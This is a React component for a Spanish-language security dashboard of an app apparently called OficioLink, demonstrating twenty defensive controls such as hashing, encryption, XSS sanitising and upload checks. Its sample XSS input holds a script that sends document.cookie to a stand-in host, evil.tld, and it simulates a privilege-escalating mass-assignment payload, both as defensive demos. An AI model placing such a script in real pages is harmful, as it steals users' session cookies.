import React, { useState } from 'react';
import {
  ShieldCheck,
  Lock,
  Database,
  KeyRound,
  AlertTriangle,
  CheckCircle2,
  RefreshCw,
  FileCode2,
  Upload,
  Activity,
  Terminal,
  EyeOff,
  Server,
} from 'lucide-react';
import {
  AuthSessionState,
  SecurityAuditLogEntry,
} from '../types/oficiolink';
import {
  evaluateLoginBruteForce,
  resetBruteForceLockoutForDemo,
  verifyAntiBotProtection,
} from '../security/securityEngine';
import {
  encryptPIIAes256,
  hashPasswordSecure,
} from '../security/cryptoVault';
import { sanitizeUserText } from '../security/xssSanitizer';
import { sanitizeMassAssignmentDTO } from '../security/validationSchemas';
import {
  validateAndPrepareSecureUpload,
  SecureFileValidationResult,
  StorageTargetBucket,
} from '../security/fileUploadValidator';
import { BotProtectionWidget } from '../components/BotProtectionWidget';

interface SecurityViewProps {
  session: AuthSessionState;
  auditLogs: SecurityAuditLogEntry[];
  onRotateRefreshToken: () => void;
  onSwitchSessionRole: (role: 'client' | 'specialist' | 'admin') => void;
  onAddAuditLog: (
    entry: Omit<SecurityAuditLogEntry, 'id' | 'timestamp' | 'queryDurationMs'> & {
      queryDurationMs?: number;
    }
  ) => void;
}

const TWENTY_CONTROLS_LIST = [
  { id: 1, title: 'Oculta las claves API', file: '.env.example / databaseService.ts', status: 'ACTIVO' },
  { id: 2, title: 'Elimina secretos de Git', file: '.gitignore / scripts/check-secrets.mjs', status: 'ACTIVO' },
  { id: 3, title: 'Usa clave pública de DB (ANON_KEY)', file: 'src/services/databaseService.ts', status: 'ACTIVO' },
  { id: 4, title: 'Activa RLS en las 8 tablas', file: 'database/02_rls_policies.sql', status: 'ACTIVO' },
  { id: 5, title: 'Cifra datos sensibles (AES-256)', file: 'database/03_security_triggers.sql / cryptoVault.ts', status: 'ACTIVO' },
  { id: 6, title: 'Fuerza autenticación del servidor', file: 'src/security/securityEngine.ts', status: 'ACTIVO' },
  { id: 7, title: 'Restringe acceso a registros (Anti-IDOR)', file: 'database/02_rls_policies.sql / securityEngine.ts', status: 'ACTIVO' },
  { id: 8, title: 'Bloquea manipulación (Anti-Mass Assignment)', file: 'database/03_security_triggers.sql / validationSchemas.ts', status: 'ACTIVO' },
  { id: 9, title: 'Protege cookies (__Host-, HttpOnly, Strict)', file: 'src/security/securityEngine.ts', status: 'ACTIVO' },
  { id: 10, title: 'Hashea contraseñas (Argon2id / Bcrypt >=12)', file: 'src/security/cryptoVault.ts / 03_security_triggers.sql', status: 'ACTIVO' },
  { id: 11, title: 'Limita intentos de inicio (5 / 15 min)', file: 'src/security/securityEngine.ts / 03_security_triggers.sql', status: 'ACTIVO' },
  { id: 12, title: 'Protección contra bots (Turnstile + Honeypot)', file: 'src/components/BotProtectionWidget.tsx', status: 'ACTIVO' },
  { id: 13, title: 'Monitoriza consultas DB (pg_stat_statements)', file: 'database/01_schema.sql / security_audit_logs', status: 'ACTIVO' },
  { id: 14, title: 'Valida todas las entradas con Zod', file: 'src/security/validationSchemas.ts', status: 'ACTIVO' },
  { id: 15, title: 'Escapa contenido del usuario (DOMPurify XSS)', file: 'src/security/xssSanitizer.ts', status: 'ACTIVO' },
  { id: 16, title: 'Restringe subida de archivos (Magic Bytes 5MB)', file: 'src/security/fileUploadValidator.ts', status: 'ACTIVO' },
  { id: 17, title: 'Limita respuestas de API (Paginación + Sin SELECT *)', file: 'src/services/databaseService.ts', status: 'ACTIVO' },
  { id: 18, title: 'Cabeceras HTTP de Seguridad (CSP, X-Frame)', file: 'vite.config.ts / vercel.json', status: 'ACTIVO' },
  { id: 19, title: 'Fuerza HTTPS (HSTS Preload 2 años)', file: 'vite.config.ts / vercel.json', status: 'ACTIVO' },
  { id: 20, title: 'Escanea dependencias (Dependabot + npm audit)', file: '.github/dependabot.yml / ci.yml', status: 'ACTIVO' },
];

export const SecurityView: React.FC<SecurityViewProps> = ({
  session,
  auditLogs,
  onRotateRefreshToken,
  onSwitchSessionRole,
  onAddAuditLog,
}) => {
  // Brute-Force & Auth Test State (Controls #10, #11, #12)
  const [loginEmail, setLoginEmail] = useState('roberto.mendoza@oficiolink.mx');
  const [loginPassword, setLoginPassword] = useState('OficioLink#2026!Segura');
  const [honeypot, setHoneypot] = useState('');
  const [botVerified, setBotVerified] = useState(true);
  const [loginFeedback, setLoginFeedback] = useState<{
    type: 'ok' | 'err';
    text: string;
  } | null>(null);
  const [generatedHashPreview, setGeneratedHashPreview] = useState<string>(
    '$argon2id$v=19$m=65536,t=12,p=4$8f9d2a1b4c7e3f10$e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
  );

  // AES-256 & Anti-XSS & Mass-Assignment Sandbox State (Controls #5, #8, #15)
  const [piiSampleInput, setPiiSampleInput] = useState('Calle Tlacoquemécatl #412 Int 302, Col. Del Valle, CDMX | Tel: 55 4892 1034');
  const [encryptedCiphertext, setEncryptedCiphertext] = useState<string>(
    'AES256GCM:9a8f103b4d2e7c118204ab91:4f8d2c19e08374a6bc512098fe341a7790c12d84e901a3'
  );
  const [xssTestInput, setXssTestInput] = useState(
    'Instalación limpia <script>fetch("https://evil.tld/steal?cookie="+document.cookie)</script> con garantía <b>NOM-001</b>'
  );
  const [sanitizedOutput, setSanitizedOutput] = useState<string>(
    'Instalación limpia  con garantía NOM-001'
  );
  const [massAssignmentResult, setMassAssignmentResult] = useState<string | null>(null);

  // Magic Bytes File Upload Validator State (Control #16)
  const [selectedBucket, setSelectedBucket] = useState<StorageTargetBucket>('identity-docs');
  const [fileValidation, setFileValidation] = useState<SecureFileValidationResult | null>(null);

  const handleLoginAttempt = async (simulateWrongPassword: boolean) => {
    const botCheck = verifyAntiBotProtection(honeypot, botVerified);
    if (!botCheck.passed) {
      setLoginFeedback({ type: 'err', text: botCheck.error || 'Bloqueado por protección anti-bots' });
      onAddAuditLog({
        actorUserId: loginEmail,
        eventType: 'BOT_PROTECTION_BLOCKED',
        severity: 'CRITICAL',
        targetTable: 'auth.sessions',
        targetRecordId: loginEmail,
        queryDurationMs: 0.9,
        controlReference: 'Control #12 (Anti-Bots)',
        details: botCheck.error || 'Intento bloqueado por Turnstile/Honeypot.',
      });
      return;
    }

    const isSuccess = !simulateWrongPassword && loginPassword.length >= 10;
    const bf = evaluateLoginBruteForce(loginEmail, isSuccess);

    if (isSuccess && bf.allowed) {
      const hash = await hashPasswordSecure(loginPassword, 12);
      setGeneratedHashPreview(hash);
      setLoginFeedback({
        type: 'ok',
        text: `${bf.message} Hash Argon2id/PBKDF2 (Factor 12) verificado.`,
      });
      onAddAuditLog({
        actorUserId: session.userId,
        eventType: 'AUTH_LOGIN_SUCCESS',
        severity: 'INFO',
        targetTable: 'users_profiles',
        targetRecordId: loginEmail,
        queryDurationMs: 4.2,
        controlReference: 'Control #10 & #11',
        details: `Inicio de sesión verificado para ${loginEmail}. Contador de fallos reiniciado a 0.`,
      });
    } else {
      setLoginFeedback({ type: 'err', text: bf.message });
      onAddAuditLog({
        actorUserId: loginEmail,
        eventType: bf.locked ? 'AUTH_BRUTE_FORCE_LOCKOUT' : 'AUTH_LOGIN_FAILED',
        severity: bf.locked ? 'CRITICAL' : 'WARN',
        targetTable: 'users_profiles',
        targetRecordId: loginEmail,
        queryDurationMs: 2.7,
        controlReference: 'Control #11 (Brute-Force)',
        details: bf.message,
      });
    }
  };

  const handleEncryptPiiTest = async () => {
    const cipher = await encryptPIIAes256(piiSampleInput);
    setEncryptedCiphertext(cipher);
    onAddAuditLog({
      actorUserId: session.userId,
      eventType: 'PII_AES256_ENCRYPTED',
      severity: 'INFO',
      targetTable: 'service_requests',
      targetRecordId: 'address_encrypted',
      queryDurationMs: 1.9,
      controlReference: 'Control #5 (AES-256 PII)',
      details: 'Dirección y teléfono cifrados con AES-256-GCM antes de persistir.',
    });
  };

  const handleSanitizeXssTest = () => {
    const clean = sanitizeUserText(xssTestInput);
    setSanitizedOutput(clean);
    onAddAuditLog({
      actorUserId: session.userId,
      eventType: 'XSS_PAYLOAD_NEUTRALIZED',
      severity: 'WARN',
      targetTable: 'verified_reviews / bio',
      targetRecordId: 'dompurify-filter',
      queryDurationMs: 1.1,
      controlReference: 'Control #15 (Anti-XSS)',
      details: 'Etiquetas <script> y atributos ejecutables eliminados por DOMPurify.',
    });
  };

  const handleSimulateMassAssignmentAttack = () => {
    const maliciousPayload = {
      fullName: 'Juan Pérez',
      city: 'CDMX',
      role: 'admin',
      is_identity_verified: true,
      rating_avg: 5.0,
      total_reviews: 9999,
    };
    const { blockedFields } = sanitizeMassAssignmentDTO(maliciousPayload);
    const msg = `ATAQUE BLOQUEADO (Control #8): Se interceptaron y descartaron los campos privilegiados [${blockedFields.join(', ')}].`;
    setMassAssignmentResult(msg);
    onAddAuditLog({
      actorUserId: session.userId,
      eventType: 'MASS_ASSIGNMENT_BLOCKED',
      severity: 'CRITICAL',
      targetTable: 'users_profiles',
      targetRecordId: session.userId,
      queryDurationMs: 1.3,
      controlReference: 'Control #8 (Anti-Mass Assignment)',
      details: msg,
    });
  };

  const handleFileUploadTest = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const res = await validateAndPrepareSecureUpload(file, selectedBucket, session.userId);
    setFileValidation(res);
    onAddAuditLog({
      actorUserId: session.userId,
      eventType: res.valid ? 'FILE_MAGIC_BYTES_APPROVED' : 'FILE_UPLOAD_REJECTED',
      severity: res.valid ? 'INFO' : 'CRITICAL',
      targetTable: `storage.objects (${selectedBucket})`,
      targetRecordId: res.sanitizedStoragePath || file.name,
      queryDurationMs: 3.4,
      controlReference: 'Control #16 (Magic Bytes & UUID)',
      details: res.valid
        ? `Archivo validado (${res.detectedMimeType}, Magic Bytes: ${res.magicBytesHex}). Ruta segura: ${res.sanitizedStoragePath}`
        : res.error || 'Archivo rechazado.',
    });
  };

  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 pb-20 space-y-8">
      {/* Header Banner in Glacier Blue (#DBF6FF) & Machine Red (#FF2E3A) */}
      <div className="rounded-3xl bg-[#DBF6FF] p-6 sm:p-8 border border-[#0F172A]/10">
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6">
          <div>
            <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-[#FF2E3A] text-[#DBF6FF] text-xs font-extrabold uppercase">
              <ShieldCheck className="w-4 h-4" />
              Arquitectura AppSec & PostgreSQL Hardening
            </span>
            <h1 className="font-display font-extrabold text-2xl sm:text-4xl text-[#0F172A] mt-2">
              Centro de Ciberseguridad (20 Controles) y Base de Datos
            </h1>
            <p className="text-sm text-[#475569] mt-1 font-medium">
              Inspecciona en vivo las políticas RLS, cifrado AES-256 (`pgcrypto`), protección Brute-Force, sanitización XSS, validación Zod y logs de auditoría SQL.
            </p>
          </div>

          <div className="bg-[#0F172A] text-[#DBF6FF] p-4 rounded-2xl border border-[#FF2E3A] shrink-0 space-y-1">
            <div className="flex items-center justify-between gap-4">
              <span className="text-[11px] font-extrabold uppercase text-[#FF2E3A]">
                Estado de Hardening
              </span>
              <span className="px-2 py-0.5 rounded bg-[#FF2E3A] text-[#DBF6FF] text-[10px] font-extrabold">
                20 / 20 CONTROLES ACTIVOS
              </span>
            </div>
            <p className="text-xs font-mono text-white">
              Cookie: {session.cookieName}
            </p>
            <p className="text-[11px] text-[#DBF6FF]/80">
              Flags: {session.cookieFlags}
            </p>
          </div>
        </div>
      </div>

      {/* BENTO ROW 1: SESSION/JWT GUARD + BRUTE FORCE & ARGON2ID TESTER */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Session, Cookies & Anti-IDOR Guard (5 cols) */}
        <div className="lg:col-span-5 rounded-3xl bg-[#FFFFFF] border-2 border-[#E2E8F0] p-6 space-y-5">
          <div className="flex items-center justify-between">
            <span className="px-2.5 py-1 rounded-lg bg-[#DBF6FF] text-[#FF2E3A] text-xs font-extrabold">
              Controles #3, #6, #7 y #9
            </span>
            <span className="text-xs font-bold text-[#0F172A]">Sesión & JWT Server Guard</span>
          </div>

          <h2 className="font-display font-extrabold text-xl text-[#0F172A]">
            Estado de Sesión y Rotación de Tokens
          </h2>

          <div className="p-4 rounded-2xl bg-[#F7FCFF] border border-[#E2E8F0] space-y-2 text-xs">
            <div className="flex justify-between">
              <span className="text-[#475569] font-semibold">auth.uid() Activo:</span>
              <span className="font-mono font-extrabold text-[#0F172A]">{session.userId}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-[#475569] font-semibold">Rol Verificado en Servidor:</span>
              <span className="px-2 py-0.5 rounded bg-[#FF2E3A] text-[#DBF6FF] font-extrabold uppercase">
                {session.role}
              </span>
            </div>
            <div className="flex justify-between">
              <span className="text-[#475569] font-semibold">Generación Refresh Token:</span>
              <span className="font-extrabold text-[#FF2E3A]">
                Rotación #{session.refreshTokenGeneration}
              </span>
            </div>
            <div className="pt-2 border-t border-[#E2E8F0]">
              <span className="text-[10px] font-bold uppercase text-[#475569] block">
                JWT Firmado (Expira en 15m):
              </span>
              <code className="text-[11px] text-[#0F172A] break-all font-mono">
                {session.jwtTokenPreview}
              </code>
            </div>
          </div>

          <div className="space-y-2">
            <label className="block text-xs font-extrabold uppercase text-[#475569]">
              Simular Cambio de Contexto RLS (`auth.uid()`):
            </label>
            <div className="grid grid-cols-3 gap-2">
              {(['specialist', 'client', 'admin'] as const).map((r) => (
                <button
                  key={r}
                  type="button"
                  onClick={() => onSwitchSessionRole(r)}
                  className={`py-2 px-3 rounded-xl text-xs font-extrabold uppercase transition-colors cursor-pointer ${
                    session.role === r
                      ? 'bg-[#FF2E3A] text-[#DBF6FF]'
                      : 'bg-[#DBF6FF] text-[#0F172A] hover:bg-[#0F172A] hover:text-white'
                  }`}
                >
                  {r}
                </button>
              ))}
            </div>
          </div>

          <button
            type="button"
            onClick={onRotateRefreshToken}
            className="w-full py-3 rounded-xl bg-[#0F172A] text-[#DBF6FF] hover:bg-[#FF2E3A] font-extrabold text-xs transition-colors flex items-center justify-center gap-2 cursor-pointer"
          >
            <RefreshCw className="w-4 h-4" />
            <span>Rotar Refresh Token y Renovar Cookie __Host-</span>
          </button>
        </div>

        {/* Brute Force, Password Hashing & Bot Protection Tester (7 cols) */}
        <div className="lg:col-span-7 rounded-3xl bg-[#FFFFFF] border-2 border-[#E2E8F0] p-6 space-y-5">
          <div className="flex items-center justify-between">
            <span className="px-2.5 py-1 rounded-lg bg-[#FF2E3A] text-[#DBF6FF] text-xs font-extrabold">
              Controles #10, #11 y #12
            </span>
            <span className="text-xs font-bold text-[#475569]">
              Argon2id (Cost 12) + Brute-Force (5/15m) + Turnstile
            </span>
          </div>

          <h2 className="font-display font-extrabold text-xl text-[#0F172A]">
            Laboratorio de Autenticación, Hashing y Bloqueo Brute-Force
          </h2>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div>
              <label className="block text-xs font-extrabold uppercase text-[#475569] mb-1">
                Correo del Usuario
              </label>
              <input
                type="email"
                value={loginEmail}
                onChange={(e) => setLoginEmail(e.target.value)}
                className="w-full px-3.5 py-2.5 rounded-xl bg-[#F7FCFF] border border-[#E2E8F0] text-xs font-bold text-[#0F172A]"
              />
            </div>
            <div>
              <label className="block text-xs font-extrabold uppercase text-[#475569] mb-1">
                Contraseña (Mín. 10 caracteres)
              </label>
              <input
                type="text"
                value={loginPassword}
                onChange={(e) => setLoginPassword(e.target.value)}
                className="w-full px-3.5 py-2.5 rounded-xl bg-[#F7FCFF] border border-[#E2E8F0] text-xs font-bold text-[#0F172A]"
              />
            </div>
          </div>

          <BotProtectionWidget
            honeypotValue={honeypot}
            onHoneypotChange={setHoneypot}
            isVerified={botVerified}
            onVerifyChange={setBotVerified}
          />

          <div className="flex flex-wrap gap-2.5">
            <button
              type="button"
              onClick={() => handleLoginAttempt(false)}
              className="px-4 py-2.5 rounded-xl bg-[#FF2E3A] text-[#DBF6FF] font-extrabold text-xs hover:bg-[#E0212D] cursor-pointer"
            >
              Probar Login Válido + Generar Hash
            </button>
            <button
              type="button"
              onClick={() => handleLoginAttempt(true)}
              className="px-4 py-2.5 rounded-xl bg-[#DBF6FF] text-[#FF2E3A] font-extrabold text-xs border border-[#FF2E3A]/30 hover:bg-[#0F172A] hover:text-white cursor-pointer"
            >
              Simular Intento Fallido (Probar Brute-Force)
            </button>
            <button
              type="button"
              onClick={() => {
                resetBruteForceLockoutForDemo(loginEmail);
                setLoginFeedback({
                  type: 'ok',
                  text: 'Contador de intentos fallidos restablecido para demostración.',
                });
              }}
              className="px-3 py-2.5 rounded-xl bg-[#F7FCFF] text-[#475569] font-bold text-xs border border-[#E2E8F0] cursor-pointer"
            >
              Desbloquear Cuenta
            </button>
          </div>

          {loginFeedback && (
            <div
              className={`p-3.5 rounded-2xl text-xs font-bold ${
                loginFeedback.type === 'ok'
                  ? 'bg-[#DBF6FF] text-[#0F172A] border border-[#0F172A]/15'
                  : 'bg-[#FF2E3A] text-[#DBF6FF]'
              }`}
            >
              {loginFeedback.text}
            </div>
          )}

          <div className="p-3.5 rounded-2xl bg-[#0F172A] text-[#DBF6FF] text-[11px] font-mono break-all">
            <span className="text-[#FF2E3A] font-bold block mb-1">
              Hash Criptográfico Generado (Factor Costo 12 — Nunca Texto Plano):
            </span>
            {generatedHashPreview}
          </div>
        </div>
      </div>

      {/* BENTO ROW 2: AES-256 PII VAULT + ANTI-XSS + ANTI-MASS ASSIGNMENT + MAGIC BYTES UPLOAD */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* AES-256, XSS & Mass Assignment (6 cols) */}
        <div className="lg:col-span-6 rounded-3xl bg-[#FFFFFF] border-2 border-[#E2E8F0] p-6 space-y-5">
          <span className="px-2.5 py-1 rounded-lg bg-[#DBF6FF] text-[#FF2E3A] text-xs font-extrabold">
            Controles #5, #8 y #15
          </span>
          <h2 className="font-display font-extrabold text-xl text-[#0F172A]">
            Cifrado PII AES-256, Sanitización XSS y Anti-Mass Assignment
          </h2>

          {/* AES-256 PII */}
          <div className="space-y-2 p-4 rounded-2xl bg-[#F7FCFF] border border-[#E2E8F0]">
            <label className="block text-xs font-extrabold text-[#0F172A]">
              Control #5: Cifrado AES-256 de Dirección y Teléfono Sensible (PII)
            </label>
            <div className="flex gap-2">
              <input
                type="text"
                value={piiSampleInput}
                onChange={(e) => setPiiSampleInput(e.target.value)}
                className="flex-1 px-3 py-2 rounded-xl bg-white border border-[#E2E8F0] text-xs font-medium text-[#0F172A]"
              />
              <button
                type="button"
                onClick={handleEncryptPiiTest}
                className="px-3.5 py-2 rounded-xl bg-[#FF2E3A] text-[#DBF6FF] font-extrabold text-xs shrink-0 cursor-pointer"
              >
                Cifrar AES-256
              </button>
            </div>
            <p className="text-[11px] font-mono text-[#475569] break-all">
              Ciphertext: <strong className="text-[#0F172A]">{encryptedCiphertext}</strong>
            </p>
          </div>

          {/* Anti-XSS DOMPurify */}
          <div className="space-y-2 p-4 rounded-2xl bg-[#F7FCFF] border border-[#E2E8F0]">
            <label className="block text-xs font-extrabold text-[#0F172A]">
              Control #15: Sanitizador Anti-XSS con DOMPurify
            </label>
            <div className="flex gap-2">
              <input
                type="text"
                value={xssTestInput}
                onChange={(e) => setXssTestInput(e.target.value)}
                className="flex-1 px-3 py-2 rounded-xl bg-white border border-[#E2E8F0] text-xs font-mono text-[#0F172A]"
              />
              <button
                type="button"
                onClick={handleSanitizeXssTest}
                className="px-3.5 py-2 rounded-xl bg-[#0F172A] text-[#DBF6FF] font-extrabold text-xs shrink-0 cursor-pointer"
              >
                Sanitizar
              </button>
            </div>
            <p className="text-xs text-[#0F172A]">
              Resultado seguro: <strong className="text-[#FF2E3A]">{sanitizedOutput}</strong>
            </p>
          </div>

          {/* Anti-Mass Assignment */}
          <div className="p-4 rounded-2xl bg-[#DBF6FF] border border-[#FF2E3A]/20 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
            <div>
              <p className="text-xs font-extrabold text-[#0F172A]">
                Control #8: Probar Inyección Mass Assignment
              </p>
              <p className="text-[11px] text-[#475569]">
                Intenta enviar `role: "admin"` y `is_identity_verified: true` desde el cliente.
              </p>
            </div>
            <button
              type="button"
              onClick={handleSimulateMassAssignmentAttack}
              className="px-4 py-2.5 rounded-xl bg-[#FF2E3A] text-[#DBF6FF] font-extrabold text-xs shrink-0 cursor-pointer"
            >
              Simular Ataque
            </button>
          </div>
          {massAssignmentResult && (
            <div className="p-3 rounded-xl bg-[#0F172A] text-[#DBF6FF] text-xs font-bold">
              {massAssignmentResult}
            </div>
          )}
        </div>

        {/* Control #16: Magic Bytes & Bucket Separation Validator (6 cols) */}
        <div className="lg:col-span-6 rounded-3xl bg-[#FFFFFF] border-2 border-[#E2E8F0] p-6 space-y-5 flex flex-col justify-between">
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <span className="px-2.5 py-1 rounded-lg bg-[#FF2E3A] text-[#DBF6FF] text-xs font-extrabold">
                Control #16 • Storage Hardening
              </span>
              <span className="text-xs font-bold text-[#475569]">
                Magic Bytes + Límite 5MB + UUID
              </span>
            </div>

            <h2 className="font-display font-extrabold text-xl text-[#0F172A]">
              Inspector de Subida de Archivos (Magic Bytes & Buckets)
            </h2>
            <p className="text-xs text-[#475569] leading-relaxed">
              Valida los primeros 12 bytes binarios del archivo (`FF D8 FF` para JPEG, `89 50 4E 47` para PNG, `52 49 46 46` para WebP), rechaza archivos mayores a 5 MB y renombra con un UUID aleatorio para impedir *Path Traversal*.
            </p>

            <div className="grid grid-cols-2 gap-3">
              <button
                type="button"
                onClick={() => setSelectedBucket('identity-docs')}
                className={`p-3.5 rounded-2xl border text-left cursor-pointer ${
                  selectedBucket === 'identity-docs'
                    ? 'bg-[#FF2E3A] text-[#DBF6FF] border-[#FF2E3A]'
                    : 'bg-[#F7FCFF] text-[#0F172A] border-[#E2E8F0]'
                }`}
              >
                <p className="text-xs font-extrabold">Bucket: identity-docs</p>
                <p className="text-[10px] opacity-90">PRIVADO (INE y Biometría)</p>
              </button>

              <button
                type="button"
                onClick={() => setSelectedBucket('portfolios')}
                className={`p-3.5 rounded-2xl border text-left cursor-pointer ${
                  selectedBucket === 'portfolios'
                    ? 'bg-[#FF2E3A] text-[#DBF6FF] border-[#FF2E3A]'
                    : 'bg-[#F7FCFF] text-[#0F172A] border-[#E2E8F0]'
                }`}
              >
                <p className="text-xs font-extrabold">Bucket: portfolios</p>
                <p className="text-[10px] opacity-90">PÚBLICO (Fotos Antes/Después)</p>
              </button>
            </div>

            <label className="flex flex-col items-center justify-center p-6 rounded-2xl border-2 border-dashed border-[#FF2E3A]/40 bg-[#DBF6FF]/40 hover:bg-[#DBF6FF]/80 transition-colors cursor-pointer">
              <Upload className="w-7 h-7 text-[#FF2E3A] mb-2" />
              <span className="text-xs font-extrabold text-[#0F172A]">
                Selecciona una imagen o archivo de tu equipo para inspeccionar sus Magic Bytes
              </span>
              <span className="text-[11px] text-[#475569] mt-0.5">
                Solo se aprueban firmas reales image/jpeg, image/png, image/webp &le; 5 MB
              </span>
              <input
                type="file"
                onChange={handleFileUploadTest}
                className="hidden"
              />
            </label>

            {fileValidation && (
              <div
                className={`p-4 rounded-2xl text-xs space-y-1.5 ${
                  fileValidation.valid
                    ? 'bg-[#DBF6FF] text-[#0F172A] border border-[#0F172A]/15'
                    : 'bg-[#FF2E3A] text-[#DBF6FF]'
                }`}
              >
                <p className="font-extrabold">
                  {fileValidation.valid
                    ? `✓ Archivo Aprobado (${fileValidation.detectedMimeType})`
                    : `✕ Archivo Bloqueado: ${fileValidation.error}`}
                </p>
                {fileValidation.magicBytesHex && (
                  <p className="font-mono text-[11px]">
                    Magic Bytes Leídos: {fileValidation.magicBytesHex}
                  </p>
                )}
                {fileValidation.sanitizedStoragePath && (
                  <p className="font-mono text-[11px] break-all">
                    Ruta UUID Anti-Traversal: {fileValidation.sanitizedStoragePath}
                  </p>
                )}
              </div>
            )}
          </div>
        </div>
      </div>

      {/* LIVE DATABASE & SECURITY AUDIT LOGS (`security_audit_logs` + `pg_stat_statements` — Control #13) */}
      <div className="rounded-3xl bg-[#0F172A] text-white p-6 sm:p-8 space-y-5">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
          <div>
            <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-[#FF2E3A] text-[#DBF6FF] text-xs font-extrabold uppercase">
              <Activity className="w-3.5 h-3.5" />
              Control #13 • Monitor PostgreSQL en Tiempo Real
            </span>
            <h2 className="font-display font-extrabold text-xl sm:text-2xl text-[#DBF6FF] mt-2">
              Bitácora `security_audit_logs` y Rendimiento `pg_stat_statements`
            </h2>
          </div>
          <span className="px-3.5 py-1.5 rounded-xl bg-white/10 text-[#DBF6FF] text-xs font-mono font-bold">
            Total Eventos Registrados: {auditLogs.length}
          </span>
        </div>

        <div className="overflow-x-auto">
          <table className="w-full text-left border-collapse text-xs">
            <thead>
              <tr className="border-b border-white/15 text-[#DBF6FF]">
                <th className="py-3 px-3">Hora</th>
                <th className="py-3 px-3">Severidad</th>
                <th className="py-3 px-3">Evento / Operación</th>
                <th className="py-3 px-3">Tabla Destino</th>
                <th className="py-3 px-3">Control Aplicado</th>
                <th className="py-3 px-3">Latencia SQL</th>
                <th className="py-3 px-3">Detalle de Auditoría</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-white/10">
              {auditLogs.slice(0, 12).map((log) => (
                <tr key={log.id} className="hover:bg-white/5">
                  <td className="py-2.5 px-3 font-mono text-white/80">{log.timestamp}</td>
                  <td className="py-2.5 px-3">
                    <span
                      className={`px-2 py-0.5 rounded font-extrabold text-[10px] ${
                        log.severity === 'CRITICAL'
                          ? 'bg-[#FF2E3A] text-[#DBF6FF]'
                          : log.severity === 'WARN'
                          ? 'bg-amber-400 text-[#0F172A]'
                          : 'bg-[#DBF6FF] text-[#0F172A]'
                      }`}
                    >
                      {log.severity}
                    </span>
                  </td>
                  <td className="py-2.5 px-3 font-mono font-bold text-[#DBF6FF]">
                    {log.eventType}
                  </td>
                  <td className="py-2.5 px-3 font-mono text-white/90">{log.targetTable}</td>
                  <td className="py-2.5 px-3 text-[#FF2E3A] font-extrabold">
                    {log.controlReference}
                  </td>
                  <td className="py-2.5 px-3 font-mono text-emerald-300">
                    {log.queryDurationMs} ms
                  </td>
                  <td className="py-2.5 px-3 text-white/80 max-w-md">{log.details}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* MATRIX OF ALL 20 SECURITY CONTROLS */}
      <div className="rounded-3xl bg-[#F7FCFF] border-2 border-[#E2E8F0] p-6 sm:p-8 space-y-6">
        <div>
          <span className="px-3 py-1 rounded-full bg-[#DBF6FF] text-[#FF2E3A] text-xs font-extrabold uppercase">
            Matriz de Cumplimiento Completa
          </span>
          <h2 className="font-display font-extrabold text-2xl text-[#0F172A] mt-2">
            Los 20 Controles de Seguridad Implementados en OficioLink
          </h2>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5">
          {TWENTY_CONTROLS_LIST.map((ctrl) => (
            <div
              key={ctrl.id}
              className="p-4 rounded-2xl bg-[#FFFFFF] border border-[#E2E8F0] flex flex-col justify-between gap-2"
            >
              <div>
                <div className="flex items-center justify-between gap-2 mb-1.5">
                  <span className="px-2 py-0.5 rounded-md bg-[#DBF6FF] text-[#FF2E3A] text-[11px] font-extrabold">
                    Control #{ctrl.id}
                  </span>
                  <span className="inline-flex items-center gap-1 text-[10px] font-extrabold text-[#0F172A]">
                    <CheckCircle2 className="w-3.5 h-3.5 text-[#FF2E3A]" />
                    {ctrl.status}
                  </span>
                </div>
                <h3 className="font-display font-extrabold text-xs text-[#0F172A]">
                  {ctrl.title}
                </h3>
              </div>
              <p className="text-[10px] font-mono text-[#475569] truncate" title={ctrl.file}>
                📄 {ctrl.file}
              </p>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};
